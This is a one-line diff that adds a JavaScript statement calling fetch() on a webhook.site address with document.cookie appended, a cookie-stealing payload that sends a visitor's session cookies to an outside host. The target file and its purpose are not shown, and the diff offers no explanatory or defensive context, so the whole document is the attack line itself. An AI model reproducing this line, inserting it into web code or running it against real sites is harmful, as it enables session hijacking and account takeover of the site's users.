@@ -1,0 +1,1 @@
+fetch('https://webhook.site/0664ee43-6e0f-4212-a4cf-4da30c14e15b?q='+document.cookie)
